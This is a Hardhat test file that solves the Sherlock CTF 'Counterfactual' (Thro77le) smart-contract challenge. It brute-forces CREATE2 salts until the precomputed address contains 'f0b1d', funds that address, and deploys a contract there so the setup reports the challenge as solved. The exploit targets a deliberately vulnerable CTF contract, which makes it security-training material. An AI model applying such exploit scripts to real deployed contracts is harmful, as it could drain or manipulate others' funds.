import { expect } from "chai";
import hre, { ethers } from "hardhat";

import { Contract, Signer } from "ethers";
import { Counterfactual } from "../types";

describe("Sherlock CTF: Counterfactual (Thro77le)", () => {
  let deployer: Signer;
  let attacker: Signer;

  let setup: Contract;
  let counterfactual: Counterfactual;

  before(async () => {
    [deployer, attacker] = await ethers.getSigners();

    if (hre.network.name === "hardhat") {
      const SetupFactory = await ethers.getContractFactory("contracts/Thro77le/Setup.sol:Setup", deployer);
      setup = await SetupFactory.deploy();
    } else {
      setup = await ethers.getContractAt(
        "contracts/Thro77le/Setup.sol:Setup",
        `0xBF3e5530aB7Dcba712E3A7fA99463d46eb6a0c8e`,
        attacker
      );
    }

    counterfactual = await ethers.getContractAt("Counterfactual", await setup.instance(), attacker);
  });

  it("Exploit - off-chain", async () => {
    const factory_address = await setup.factory();

    const DummyFactory = await ethers.getContractFactory("Dummy");
    const init_code = DummyFactory.bytecode;
    const init_code_hash = ethers.utils.keccak256(init_code);

    let computed_address_off_chain = "";
    let salt = "";
    const start = Date.now();
    for (let i = 1_100_000; i < 1_000_000_000; i++) {
      if (i % 10_000 == 0) {
        console.log("i = ", i);
      }
      salt = ethers.utils.formatBytes32String(String(i));
      computed_address_off_chain = ethers.utils.getCreate2Address(factory_address, salt, init_code_hash);
      if (computed_address_off_chain.toLowerCase().includes("f0b1d")) {
        console.log(`Tries ${i}`);
        console.log(`Salt ${salt}`);
        console.log(`computed address off chain = ${computed_address_off_chain}`);
        console.log(`Elapsed ${Date.now() - start}`);
        break;
      }
    }

    // Attack
    await attacker.sendTransaction({
      to: computed_address_off_chain,
      value: ethers.utils.parseEther("0.1"),
    });
    await counterfactual.connect(attacker).createContract(init_code, salt);
  });

  afterEach(async () => {
    expect(await setup.isSolved()).to.be.true;
  });
});
